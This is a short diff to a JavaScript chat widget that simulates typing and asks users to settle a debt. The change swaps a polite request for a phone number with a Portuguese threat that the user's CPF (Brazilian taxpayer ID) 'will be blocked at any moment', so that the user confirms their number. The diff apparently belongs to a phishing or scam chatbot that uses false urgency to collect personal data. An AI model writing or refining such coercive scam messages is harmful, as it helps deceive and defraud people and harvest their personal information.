@@ -786,7 +786,7 @@ async function initializeChat() {
         if (message.requestPhone) {
             await new Promise(resolve => setTimeout(resolve, 2000));
             await showTyping(3000);
-            addMessage(`Para continuar com a regularização do débito, preciso confirmar seu número de telefone.`, true, true);
+            addMessage(`Informo que seu CPF será bloqueado a qualquer momento! Para regular o débito, preciso que confirme seu número de telefone abaixo:`, true, true);
             
             // Show phone input form
             setTimeout(() => {
